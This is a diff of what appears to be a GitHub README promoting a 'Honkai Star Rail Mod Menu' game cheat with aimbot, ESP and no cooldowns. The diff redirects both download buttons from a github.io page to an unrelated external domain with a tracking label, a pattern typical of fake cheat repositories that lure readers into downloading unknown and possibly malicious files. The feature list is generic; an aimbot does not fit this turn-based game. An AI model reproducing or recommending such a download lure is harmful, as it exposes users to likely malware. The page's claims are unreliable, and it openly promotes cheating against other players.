@@ -2,7 +2,7 @@
 
 The **Honkai Star Rail Mod Menu** offers players a wide range of powerful mods to elevate their experience in this immersive, sci-fi RPG. With features such as aimbot, ESP, no cooldowns, and other customizations, this mod menu provides an edge in combat and exploration. Whether you want to enhance your gameplay, gain an advantage in battles, or simply have fun with new features, the mod menu is designed to give you full control over your journey in **Honkai Star Rail**.
 
-[![Download HNK ModMenu](https://img.shields.io/badge/Download-HNK%20ModMenu-blueviolet)](https://honkai-star-rail-modmenu.github.io/.github/)
+[![Download HNK ModMenu](https://img.shields.io/badge/Download-HNK%20ModMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
 
 ## ⚡ Key Features
 
@@ -35,4 +35,4 @@ The **Honkai Star Rail Mod Menu** offers players a wide range of powerful mods t
 4. **Customize settings** for each feature to suit your playstyle, ensuring optimal performance during gameplay.
 5. **Enjoy an enhanced experience** as you explore the world of Honkai Star Rail with an unfair advantage in combat and exploration.
 
-[![Download HNK ModMenu](https://img.shields.io/badge/Download-HNK%20ModMenu-blueviolet)](https://honkai-star-rail-modmenu.github.io/.github/)
+[![Download HNK ModMenu](https://img.shields.io/badge/Download-HNK%20ModMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
